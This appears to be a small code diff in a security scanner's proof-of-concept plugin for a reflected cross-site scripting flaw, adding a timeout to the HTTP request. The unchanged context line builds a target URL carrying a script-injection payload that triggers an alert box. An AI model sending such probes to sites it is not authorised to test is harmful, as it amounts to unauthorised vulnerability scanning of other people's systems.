@@ -24,7 +24,7 @@ class XssPOC(BasePoc):
         vul_url = '%s/?q=node<script>alert(\'sec_test\')</script>' % self.url
 
         try:
-            r = requests.get(vul_url, verify=False)
+            r = requests.get(vul_url, verify=False, timeout=30)
         except requests.ConnectionError:
             # 可能的封禁
             raise requests.ConnectionError
